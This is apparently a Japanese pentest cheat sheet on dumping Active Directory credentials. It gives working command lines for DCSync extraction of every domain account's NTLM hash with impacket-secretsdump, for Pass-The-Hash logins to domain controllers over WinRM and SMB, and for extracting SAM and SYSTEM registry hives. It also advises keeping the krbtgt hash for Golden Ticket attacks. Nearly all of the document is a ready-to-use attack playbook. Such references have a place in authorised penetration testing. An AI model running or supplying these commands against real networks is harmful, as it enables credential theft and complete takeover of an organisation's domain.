# 認証情報のダンプ（DCSync / Pass-The-Hash）

## 概要

Domain Admin 相当の権限または DCSync 権限を取得した後に、ドメイン内の全アカウントの NTLM ハッシュを取得する手法。取得したハッシュは Pass-The-Hash でそのまま認証に使用できる。

---

## DCSync による全ハッシュの取得

### 着火条件

以下のいずれかで DCSync 権限がある場合：
- Domain Admins メンバー
- `DS-Replication-Get-Changes` と `DS-Replication-Get-Changes-All` 権限を持つ
- Kerberos チケット（RBCD / Unconstrained Delegation で取得した DC$ の TGT）

### 手順

**パスワード認証で実行：**
```bash
impacket-secretsdump \
  -just-dc-ntlm \
  '[DOMAIN]/[USER]:[PASSWORD]@[DC_FQDN]'
```

**NTLM ハッシュで実行（Pass-The-Hash）：**
```bash
impacket-secretsdump \
  -hashes :[NTLM_HASH] \
  -just-dc-ntlm \
  '[DOMAIN]/Administrator@[DC_FQDN]'
```

**Kerberos チケットで実行：**
```bash
export KRB5CCNAME=/path/to/ticket.ccache

impacket-secretsdump \
  -k -no-pass \
  -just-dc-ntlm \
  -target-ip [DC_IP] \
  'administrator@[DC_FQDN]'
```

### 出力の読み方

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
[USER]:1104:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
```

- フィールド順: `ユーザー名:RID:LMハッシュ:NTLMハッシュ`
- `aad3b435b51404eeaad3b435b51404ee` は空の LM ハッシュ（現代の環境では常にこれ）
- **NTLM ハッシュ部分（4番目のフィールド）** を使用する

---

## Pass-The-Hash によるアクセス

NTLM ハッシュをパスワードの代わりにそのまま使用する。

### WinRM（evil-winrm）

```bash
evil-winrm -i [DC_IP] -u Administrator -H '[NTLM_HASH]'
```

### SMB（smbclient）

```bash
smbclient //[DC_IP]/C$ -U '[DOMAIN]\Administrator' --pw-nt-hash '[NTLM_HASH]'
```

### SMB（impacket）

```bash
impacket-smbexec -hashes :[NTLM_HASH] '[DOMAIN]/Administrator@[DC_IP]'
impacket-psexec -hashes :[NTLM_HASH] '[DOMAIN]/Administrator@[DC_IP]'
impacket-wmiexec -hashes :[NTLM_HASH] '[DOMAIN]/Administrator@[DC_IP]'
```

### 確認（NetExec）

```bash
netexec smb [DC_IP] -u Administrator -H '[NTLM_HASH]'
# [+] ... (Pwn3d!) が出れば成功
```

---

## ローカルの SAM / SYSTEM ハイブからのハッシュ取得

（Domain Controller 以外のメンバーサーバーやワークステーションの場合）

```bash
# レジストリからSAMとSYSTEMをバックアップ
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive

# 攻撃側マシンにダウンロード後
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

---

## 注意点・落とし穴

- `-just-dc-ntlm` を付けないと NTDS.dit の全内容（非常に大量）が出力される
- 出力は必ずファイルにリダイレクトして保存しておく
- krbtgt ハッシュは Golden Ticket 攻撃で使用できるため必ず保存する

---

## 関連技術
- RBCD で Admin TGS を取得後 → DCSync を実行
- Unconstrained Delegation で DC$ TGT を取得後 → DCSync を実行
- 取得したチケットの使用方法 → `Kerberos_Attacks/Pass_The_Ticket.md`
